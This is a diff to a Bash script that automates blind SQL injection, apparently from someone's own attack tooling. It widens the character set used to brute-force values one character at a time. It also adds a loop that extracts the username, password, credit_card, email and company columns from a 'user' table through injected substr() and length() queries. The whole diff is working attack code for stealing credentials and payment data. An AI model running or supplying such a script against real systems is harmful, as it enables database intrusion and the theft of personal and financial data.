@@ -115,7 +115,7 @@ function bruteForceName() {
 			# sql function 'substr()' starts at the number one and not with zero
 			extractionStartPosition=$((i+1))
 			offset=$index
-			for letter in {{a..z},_}; do
+			for letter in {{a..z},@,_,\ ,$,.,{0..9}}; do
 				sqli="$(printf "${placeholderSqli}" "$extractionStartPosition" "$offset" "$letter")"
 				request "${sqli}"
 				result=$(echo $?)
@@ -183,6 +183,7 @@ object['nameOfTables']=$(bruteForceName "$sqlQuery" "${object['amountOfTables']}
 ## count tables
 object['nameOfTables']='product system_us user'
 for table in ${object['nameOfTables']}; do
+	continue
 	echo "searching the Table => $table"
 	# total conunt
 	sqlQuery="SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}'"
@@ -198,6 +199,33 @@ for table in ${object['nameOfTables']}; do
 	echo "The table ${table} has the follwing columns ${object['namesOfColumns']}"
 
 done
+# SELECT columns from table limit 1 offset 1;
+
+object['namesOfColumns']='username _password credit_card email company'
+# Content
+for column in ${object['namesOfColumns']}; do
+	if [ "$column" == 'id' ]; then
+		continue
+	fi
+
+	echo $column
+
+        echo "searching the Table => $column"
+        # total conunt
+        sqlQuery="SELECT COUNT($column) FROM user"
+        object['amountOfContent']=$(getAmount "$sqlQuery")
+        echo "${object['amountOfContent']}"
+        # name length
+        sqlQuery="SELECT length($column) FROM user"
+        object['lengthOfContent']=$(getLength "$sqlQuery" "${object['amountOfContent']}")
+        echo "${object['lengthOfContent']}"
+        # names
+        sqlQuery="SELECT substr(LOWER($column), %d,1) FROM user LIMIT 1 OFFSET %d"
+        object['namesOfContent']=$(bruteForceName "$sqlQuery" "${object['amountOfContent']}" "${object['lengthOfContent']}")
+        echo "${object['namesOfContent']}"
+
+done
+
 sqlQuery="SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}'"
 #object['amountOfTables']=$(getAmount "$sqlQuery")
 
